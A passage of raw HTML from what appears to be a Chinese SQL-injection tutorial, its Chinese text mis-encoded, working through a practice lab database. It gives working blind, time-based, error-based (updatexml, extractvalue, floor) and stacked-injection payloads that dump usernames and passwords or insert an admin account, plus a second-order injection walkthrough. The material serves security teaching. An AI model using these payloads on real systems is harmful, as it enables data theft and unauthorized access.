class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"e\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>æŠ¥é”™</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr((select table_name from information_schema.tables where table_schema=\"security\" limit 1,1 ),1,1)=\"r\" %23</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>æ­£å¸¸</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>ä»¥æ­¤ç±»æ¨çˆ†ç ´æ‰€æœ‰è¡¨</pre></td></tr><tr><td data-num=\"58\"></td><td><pre>emails,referers,uagents,users</pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>çˆ†å­—æ®µå</pre></td></tr><tr><td data-num=\"61\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> column_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">\"security\"</span> <span class=\"token operator\">and</span> table_name<span class=\"token operator\">=</span><span class=\"token string\">\"users\"</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"r\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>æŠ¥é”™</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr((select column_name from information_schema.columns where table_schema=\"security\" and table_name=\"users\" limit 0,1 ),1,1)=\"i\" %23</pre></td></tr><tr><td data-num=\"64\"></td><td><pre>æ­£å¸¸</pre></td></tr><tr><td data-num=\"65\"></td><td><pre>çˆ†å‡ºæ‰€æœ‰å­—æ®µå</pre></td></tr><tr><td data-num=\"66\"></td><td><pre>id,username.password</pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>çˆ†æ•°æ®</pre></td></tr><tr><td data-num=\"69\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> username <span class=\"token keyword\">from</span> users <span class=\"token keyword\">limit</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"d\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>æ­£å¸¸</pre></td></tr><tr><td data-num=\"71\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span>'<span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> username <span class=\"token keyword\">from</span> users <span class=\"token keyword\">limit</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"u\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>æ­£å¸¸</pre></td></tr><tr><td data-num=\"73\"></td><td><pre>ä»¥æ­¤ç±»æ¨</pre></td></tr><tr><td data-num=\"74\"></td><td><pre>å¯ä»¥ç”¨burpçˆ†ç ´åŠŸèƒ½çˆ†ç ´å‡ºæ‰€æœ‰æ•°æ®</pre></td></tr><tr><td data-num=\"75\"></td><td><pre>å«Œå¼ƒå¤ªæ…¢ä¹Ÿå¯ä»¥å†™è„šæœ¬æˆ–è€…ç”¨sqlmap</pre></td></tr></table></figure><h3 id=\"æ—¶é—´ç›²æ³¨\"><a class=\"markdownIt-Anchor\" href=\"#æ—¶é—´ç›²æ³¨\">#</a> <span class=\"kbd\">æ—¶é—´ç›²æ³¨</span></h3>\n<p>ç›²æ³¨æ˜¯åœ¨ SQL æ³¨å…¥æ”»å‡»è¿‡ç¨‹ä¸­ï¼ŒæœåŠ¡å™¨å…³é—­äº†é”™è¯¯å›æ˜¾ï¼Œå•çº¯é€šè¿‡æœåŠ¡å™¨è¿”å›å†…å®¹çš„å˜åŒ–æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ SQL æ³¨å…¥çš„æ–¹å¼ ã€‚</p>\n<p>å¯ä»¥ç”¨ benchmarkï¼Œsleep ç­‰é€ æˆå»¶æ—¶æ•ˆæœçš„å‡½æ•°ã€‚</p>\n<p>å¦‚æœ benkchmark å’Œ sleep å…³é”®å­—è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥è®©ä¸¤ä¸ªéå¸¸å¤§çš„æ•°æ®è¡¨åš<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMyNzYzNjQzL2FydGljbGUvZGV0YWlscy83OTE4NzkzMQ==\">ç¬›å¡å°”ç§¯ (opens new window)</span> äº§ç”Ÿå¤§é‡çš„è®¡ç®—ä»è€Œäº§ç”Ÿæ—¶é—´å»¶è¿Ÿï¼›</p>\n<p>æˆ–è€…åˆ©ç”¨å¤æ‚çš„æ­£åˆ™è¡¨è¾¾å¼å»åŒ¹é…ä¸€ä¸ªè¶…é•¿å­—ç¬¦ä¸²æ¥äº§ç”Ÿæ—¶é—´å»¶è¿Ÿã€‚</p>\n<p>1ã€åˆ©ç”¨ sleep åˆ¤æ–­æ•°æ®åº“åé•¿åº¦</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token string\">' and sleep(5) and 1=1--+\té¡µé¢è¿”å›ä¸æ­£å¸¸ï¼Œå»¶æ—¶5ç§’</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>'</span> <span class=\"token operator\">and</span> sleep<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token comment\">--+\té¡µé¢è¿”å›ä¸æ­£å¸¸ï¼Œä¸å»¶æ—¶</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">and</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">--if (æ¡ä»¶è¡¨è¾¾å¼ï¼ŒçœŸï¼Œå‡) --C è¯­è¨€çš„ä¸‰ç›®è¿ç®—ç¬¦ç±»ä¼¼</span></pre></td></tr></table></figure><p>2ã€è·å–æ•°æ®åº“å</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">and</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>substr<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">--+</span></pre></td></tr></table></figure><h3 id=\"æŠ¥é”™æ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#æŠ¥é”™æ³¨å…¥\">#</a> <span class=\"kbd\">æŠ¥é”™æ³¨å…¥</span></h3>\n<p>åœ¨ SQL æ³¨å…¥æ”»å‡»è¿‡ç¨‹ä¸­ï¼ŒæœåŠ¡å™¨å¼€å¯äº†é”™è¯¯å›æ˜¾ï¼Œé¡µé¢ä¼šè¿”å›é”™è¯¯ä¿¡æ¯ï¼Œåˆ©ç”¨æŠ¥é”™å‡½æ•°è·å–æ•°æ®åº“æ•°æ®ã€‚</p>\n<p>å¸¸ç”¨çš„ MySQL æŠ¥é”™å‡½æ•°</p>\n<h4 id=\"updatexmlå‡½æ•°\"><a class=\"markdownIt-Anchor\" href=\"#updatexmlå‡½æ•°\">#</a> updatexml å‡½æ•°</h4>\n<p>MySQL çš„ UPDATEXML () å‡½æ•°å¯ä»¥ç”¨äºä¿®æ”¹ XML ç±»å‹çš„æ•°æ®ï¼Œå®ƒå¯ä»¥æ›´æ–° XML æ•°æ®ä¸­çš„ä¸€ä¸ªæˆ–å¤šä¸ªèŠ‚ç‚¹å€¼ã€‚</p>\n<p>è¿™ä¸ªå‡½æ•°çš„å‚æ•°æœ‰ä¸‰ä¸ªï¼š</p>\n<ul>\n<li>XML æ•°æ®</li>\n<li>XPath è¡¨è¾¾å¼ï¼šç”¨äºæŒ‡å®šè¦ä¿®æ”¹çš„èŠ‚ç‚¹ä½ç½®</li>\n<li>æ–°çš„èŠ‚ç‚¹å€¼ï¼šç”¨äºæ›¿æ¢å½“å‰èŠ‚ç‚¹çš„å€¼</li>\n</ul>\n<p>ä¸‹é¢æ˜¯ UPDATEXML () å‡½æ•°çš„è¯­æ³•ï¼š</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ä¸‹é¢æ˜¯UPDATEXML<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>å‡½æ•°çš„è¯­æ³•ï¼š</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>UPDATEXML<span class=\"token punctuation\">(</span>xml_target<span class=\"token punctuation\">,</span> xpath_expr<span class=\"token punctuation\">,</span> new_val<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>å…¶ä¸­ï¼Œxml_targetæ˜¯è¦ä¿®æ”¹çš„XMLç±»å‹çš„æ•°æ®ï¼›xpath_expræ˜¯XPathè¡¨è¾¾å¼ï¼Œç”¨</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>äºæŒ‡å®šè¦ä¿®æ”¹çš„èŠ‚ç‚¹ä½ç½®ï¼›new_valæŒ‡å®šæ–°çš„èŠ‚ç‚¹å€¼ã€‚</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>ç¤ºä¾‹ä¸€ï¼š</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>å‡è®¾æ•°æ®è¡¨ä¸­æœ‰ä»¥ä¸‹çš„XMLç±»å‹çš„æ•°æ®ï¼š</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">&lt;</span>book<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token operator\">&lt;</span>title<span class=\"token operator\">></span>MySQL Basics<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>title<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token operator\">&lt;</span>author<span class=\"token operator\">></span>John Doe<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>author<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token operator\">&lt;</span>price<span class=\"token operator\">></span><span class=\"token number\">19.99</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>price<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>book<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨UPDATEXML<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>å‡½æ•°æ¥ä¿®æ”¹ä¸€äº›èŠ‚ç‚¹çš„å€¼ï¼š</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">UPDATE</span> books</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">SET</span> book <span class=\"token operator\">=</span> UPDATEXML<span class=\"token punctuation\">(</span>book<span class=\"token punctuation\">,</span> <span class=\"token string\">'/book/title'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Learning MySQL'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">WHERE</span> id <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>ä¸Šé¢çš„è¯­å¥å°†ä¼šæŠŠè¡¨ä¸­idä¸º<span class=\"token number\">1</span>çš„è®°å½•çš„titleèŠ‚ç‚¹çš„å€¼ä¿®æ”¹ä¸º<span class=\"token string\">\"Learning MySQL\"</span>ã€‚</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>ç¤ºä¾‹äºŒï¼š</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>ç°åœ¨æœ‰ä»¥ä¸‹çš„XMLç±»å‹çš„æ•°æ®ï¼š</pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token operator\">&lt;</span>root<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token operator\">&lt;</span>message<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token operator\">&lt;</span>sender<span class=\"token operator\">></span>Tom<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>sender<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token operator\">&lt;</span>receiver<span class=\"token operator\">></span>Kate<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>receiver<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token operator\">&lt;</span>content<span class=\"token operator\">></span>Hello<span class=\"token punctuation\">,</span> how are you?<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>content<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>message<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>root<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨UPDATEXML<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>å‡½æ•°æ¥æ›¿æ¢èŠ‚ç‚¹çš„å€¼ï¼Œæ¯”å¦‚å°†æ¶ˆæ¯å†…å®¹çš„å€¼æ›¿æ¢ä¸ºæ–°çš„å†…å®¹ï¼š</pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">UPDATE</span> messages</pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">SET</span> msg <span class=\"token operator\">=</span> UPDATEXML<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span> <span class=\"token string\">'/root/message/content'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'I am fine, thank you.'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">WHERE</span> id <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>ä¸Šé¢çš„è¯­å¥å°†ä¼šæŠŠè¡¨ä¸­idä¸º<span class=\"token number\">1</span>çš„è®°å½•çš„contentèŠ‚ç‚¹çš„å€¼ä¿®æ”¹ä¸º<span class=\"token string\">\"I am fine, thank you.\"</span>ã€‚</pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\">--xpath è¯­æ³•é”™è¯¯</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>extractvalue<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\">-- æŸ¥è¯¢èŠ‚ç‚¹å†…å®¹</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>updatexml<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\t\t<span class=\"token comment\">-- ä¿®æ”¹æŸ¥è¯¢åˆ°çš„å†…å®¹</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>å®ƒä»¬çš„ç¬¬äºŒä¸ªå‚æ•°éƒ½è¦æ±‚æ˜¯ç¬¦åˆxpathè¯­æ³•çš„å­—ç¬¦ä¸²</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>å¦‚æœä¸æ»¡è¶³è¦æ±‚åˆ™ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”å°†æŸ¥è¯¢ç»“æœæ”¾åœ¨æŠ¥é”™ä¿¡æ¯é‡Œ</pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\">-- ä¸»é”®é‡å¤ï¼ˆduplicate entryï¼‰</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>floor<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\t\t\t<span class=\"token comment\">-- è¿”å›å°äºç­‰äºè¯¥å€¼çš„æœ€å¤§æ•´æ•°</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>åªè¦æ˜¯countï¼Œrand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>ï¼Œ<span class=\"token keyword\">group</span> <span class=\"token keyword\">by</span> ä¸‰ä¸ªè¿ç”¨å°±ä¼šé€ æˆè¿™ç§ä¸»é”®é‡å¤æŠ¥é”™</pre></td></tr></table></figure><h4 id=\"çˆ†æ•°æ®åº“\"><a class=\"markdownIt-Anchor\" href=\"#çˆ†æ•°æ®åº“\">#</a> çˆ†æ•°æ®åº“</h4>\n<p>?id=1â€™%20 and updatexml(1,concat(0x7e,(select database()),0x7e),1)â€“+</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/9689.png\" alt=\"\"></p>\n<p>â€“0x7e æ˜¯ &quot;~&quot; ç¬¦å·çš„ 16 è¿›åˆ¶ï¼Œåœ¨è¿™ä½œä¸ºåˆ†éš”ç¬¦</p>\n<h4 id=\"çˆ†è¡¨\"><a class=\"markdownIt-Anchor\" href=\"#çˆ†è¡¨\">#</a> çˆ†è¡¨</h4>\n<p>?id=1â€™%20 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=â€œsecurityâ€),0x7e),1)â€“+</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/tyuk.png\" alt=\"\"></p>\n<h4 id=\"çˆ†å­—æ®µ\"><a class=\"markdownIt-Anchor\" href=\"#çˆ†å­—æ®µ\">#</a> çˆ†å­—æ®µ</h4>\n<p>?id=1â€™%20 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=â€œsecurityâ€ and table_name=â€œusersâ€ limit 1,1),0x7e),1) %23</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/sdgfbsre.png\" alt=\"\"></p>\n<h4 id=\"çˆ†æ•°æ®\"><a class=\"markdownIt-Anchor\" href=\"#çˆ†æ•°æ®\">#</a> çˆ†æ•°æ®</h4>\n<p>?id=1â€™%20 and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 4,1),0x7e),1) %23</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/dthsrhtrs.png\" alt=\"\"></p>\n<h4 id=\"extractvalueå‡½æ•°ç”¨æ³•\"><a class=\"markdownIt-Anchor\" href=\"#extractvalueå‡½æ•°ç”¨æ³•\">#</a> â€“extractvalue å‡½æ•°ç”¨æ³•</h4>\n<p>?id=1â€™%20 and extractvalue(1,concat(0x7e,(select database()),0x7e))â€“+</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/shrthrthrhthe.png\" alt=\"\"></p>\n<p>â€“floor()</p>\n<p>?id=1â€™%20 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) %23</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/989898.png\" alt=\"\"></p>\n<h3 id=\"å †å æ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#å †å æ³¨å…¥\">#</a> <span class=\"kbd\">å †å æ³¨å…¥</span></h3>\n<p>å †å æŸ¥è¯¢ï¼šå †å æŸ¥è¯¢å¯ä»¥æ‰§è¡Œå¤šæ¡ SQL è¯­å¥ï¼Œè¯­å¥ä¹‹é—´ä»¥åˆ†å· (;) éš”å¼€ï¼Œè€Œå †å æŸ¥è¯¢æ³¨å…¥æ”»å‡»å°±æ˜¯åˆ©ç”¨æ­¤ç‰¹ ç‚¹ï¼Œåœ¨ç¬¬äºŒæ¡è¯­å¥ä¸­æ„é€ è¦æ‰§è¡Œæ”»å‡»çš„è¯­å¥ã€‚ åœ¨ mysql é‡Œ mysqli_multi_query å’Œ mysql_multi_query è¿™ä¸¤ä¸ªå‡½æ•°æ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢ã€‚å¤šä¸ªæŸ¥è¯¢ç”¨åˆ†å·ï¼›è¿›è¡Œåˆ†éš”ã€‚</p>\n<p>ä½†æ˜¯å †å æŸ¥è¯¢åªèƒ½è¿”å›ç¬¬ä¸€æ¡æŸ¥è¯¢ä¿¡æ¯ï¼Œä¸è¿”å›åé¢çš„ä¿¡æ¯ã€‚ select version ();select database () å †å æ³¨å…¥çš„å±å®³æ˜¯å¾ˆå¤§çš„ å¯ä»¥ä»»æ„ä½¿ç”¨å¢åˆ æ”¹æŸ¥çš„è¯­å¥ï¼Œä¾‹å¦‚åˆ é™¤æ•°æ®åº“ ä¿®æ”¹æ•°æ®åº“ï¼Œæ·»åŠ æ•°æ®åº“ç”¨æˆ·</p>\n<p>-1â€™ union select 1,2,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()  limit 1)  %23</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/0808.png\" alt=\"\"></p>\n<p>æŠŠåº“é‡Œæ‰€æœ‰çš„è¡¨è·å–å‡ºæ¥ï¼Œå†è·å–å­—æ®µ -1â€™ union select 1,2,(select group_concat (column_name) from information_schema.columns where TABLE_NAME=â€˜usersâ€™ limit 1)  %23</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/656565e.png\" alt=\"\"></p>\n<p>çŸ¥é“è¡¨çš„åˆ—çš„æƒ…å†µä¸‹ä½¿ç”¨ insert into æ’å…¥è¯­å¥è¿›è¡Œå¢åŠ è´¦å·ã€‚å¦‚æœæ˜¯ç®¡ç†è¡¨ ç›´æ¥æ·»åŠ ç®¡ç†å‘˜è´¦å·å³å¯ ç™»å½•åå°</p>\n<p>id=-999â€™;insert into users (id,username,password) values (1000,â€˜admin999â€™,â€˜123456â€™)â€“+ è®¿é—® 1000 å³å¯è®¿é—®åˆ°åˆšåˆšæ·»åŠ çš„è´¦å·</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/6666e.png\" alt=\"\"></p>\n<h3 id=\"äºŒæ¬¡æ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#äºŒæ¬¡æ³¨å…¥\">#</a> <span class=\"kbd\">äºŒæ¬¡æ³¨å…¥</span></h3>\n<p>äºŒæ¬¡æ³¨å…¥æ¼æ´æ˜¯ä¸€ç§åœ¨ Web åº”ç”¨ç¨‹åºä¸­å¹¿æ³›å­˜åœ¨çš„å®‰å…¨æ¼æ´å½¢å¼ã€‚ç›¸å¯¹äºä¸€æ¬¡æ³¨å…¥æ¼æ´è€Œè¨€ï¼ŒäºŒæ¬¡æ³¨å…¥æ¼ æ´æ›´éš¾ä»¥è¢«å‘ç°ï¼Œä½†æ˜¯å®ƒå´å…·æœ‰ä¸ä¸€æ¬¡æ³¨å…¥æ”»å‡»æ¼æ´ç›¸åŒçš„æ”»å‡»å¨åŠ›ã€‚ äºŒæ¬¡æ³¨å…¥åŸç† äºŒæ¬¡æ³¨å…¥çš„åŸç†ï¼Œåœ¨ç¬¬ä¸€æ¬¡è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œä»…ä»…åªæ˜¯ä½¿ç”¨äº† addslashes æˆ–è€…æ˜¯å€ŸåŠ©</p>\n<p>get_magic_quotes_gpc å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ï¼Œä½†æ˜¯ addslashes æœ‰ä¸€ä¸ªç‰¹ç‚¹å°±æ˜¯è™½ç„¶å‚æ•°åœ¨è¿‡æ»¤ åä¼šæ·»åŠ  â€œ\\â€ è¿›è¡Œè½¬ä¹‰ï¼Œä½†æ˜¯ â€œ\\â€ å¹¶ä¸ä¼šæ’å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œåœ¨å†™å…¥æ•°æ®åº“çš„æ—¶å€™è¿˜æ˜¯ä¿ç•™äº†åŸæ¥çš„æ•° æ®ã€‚ åœ¨å°†æ•°æ®å­˜å…¥åˆ°äº†æ•°æ®åº“ä¸­ä¹‹åï¼Œå¼€å‘è€…å°±è®¤ä¸ºæ•°æ®æ˜¯å¯ä¿¡çš„ã€‚åœ¨ä¸‹ä¸€æ¬¡è¿›è¡Œéœ€è¦è¿›è¡ŒæŸ¥è¯¢çš„æ—¶å€™ï¼Œç›´æ¥ ä»æ•°æ®åº“ä¸­å–å‡ºäº†è„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œä¸‹ä¸€æ­¥çš„æ£€éªŒå’Œå¤„ç†ï¼Œè¿™æ ·å°±ä¼šé€ æˆ SQL çš„äºŒæ¬¡æ³¨å…¥ã€‚æ¯”å¦‚åœ¨ç¬¬ä¸€æ¬¡ æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œæ•°æ®ä¸­å¸¦æœ‰å•å¼•å·ï¼Œç›´æ¥æ’å…¥åˆ°äº†æ•°æ®åº“ä¸­ï¼›ç„¶ååœ¨ä¸‹ä¸€æ¬¡ä½¿ç”¨ä¸­åœ¨æ‹¼å‡‘çš„è¿‡ç¨‹ä¸­ï¼Œå°± å½¢æˆäº†äºŒæ¬¡æ³¨å…¥.</p>\n<p>äºŒæ¬¡æ³¨å…¥å›¾è§£</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2ci1.png\" alt=\"\"></p>\n<p>ç°åœ¨å¯†ç æ˜¯ admin 999999</p>\n<p>ä¿®æ”¹å¯†ç é¡µé¢</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2ci2.png\" alt=\"\"></p>\n<p>æ³¨å†Œ adminâ€™#</p>\n<p>ç™»é™†è¿›å»</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2ci3.png\" alt=\"\"></p>\n<p>ä¿®æ”¹å¯†ç </p>\n<p>ä¿®æ”¹çš„æ˜¯ admin çš„å¯†ç </p>\n<p><img 